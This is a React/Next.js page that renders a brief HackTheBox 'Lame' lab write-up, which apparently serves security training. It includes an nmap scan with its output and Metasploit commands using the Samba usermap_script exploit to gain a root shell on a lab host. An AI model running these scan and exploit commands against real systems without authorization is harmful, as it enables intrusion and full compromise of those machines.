import React from 'react'
import Head from 'next/head'
import Link from 'next/link'

export default function HTBLameWriteup() {
  return (
    <div className="min-h-screen bg-[#F0EAD6] text-blue-700 font-mono p-4">
      <Head>
        <title>HackTheBox - Lame Writeup | A-Z.fi</title>
      </Head>
      <Link href="/" className="mb-4 inline-block text-blue-700 hover:underline">← Back to Home</Link>
      <h1 className="text-3xl font-bold mb-4">HackTheBox - Lame Writeup</h1>
      <div className="prose prose-blue max-w-none">
        <h2>Introduction</h2>
        <p>Lame is a beginner-friendly machine on HackTheBox. It&apos;s an older machine that demonstrates the importance of keeping systems updated and the dangers of using outdated software.</p>

        <h2>Reconnaissance</h2>
        <p>We start with a basic nmap scan:</p>
        <pre className="bg-gray-800 text-white p-4 rounded-md">
          {`nmap -sC -sV -oA nmap/lame 10.10.10.3

PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X
445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian`}
        </pre>

        <h2>Exploitation</h2>
        <p>The Samba version (3.0.20) is vulnerable to a remote code execution exploit. We can use Metasploit to exploit this:</p>
        <pre className="bg-gray-800 text-white p-4 rounded-md">
          {`msfconsole
use exploit/multi/samba/usermap_script
set RHOSTS 10.10.10.3
exploit`}
        </pre>

        <h2>Privilege Escalation</h2>
        <p>The exploit gives us a root shell directly, so no further privilege escalation is necessary.</p>

        <h2>Conclusion</h2>
        <p>This machine demonstrates the importance of keeping systems up to date. The vulnerable Samba version allowed for easy exploitation and immediate root access.</p>
      </div>
    </div>
  )
}
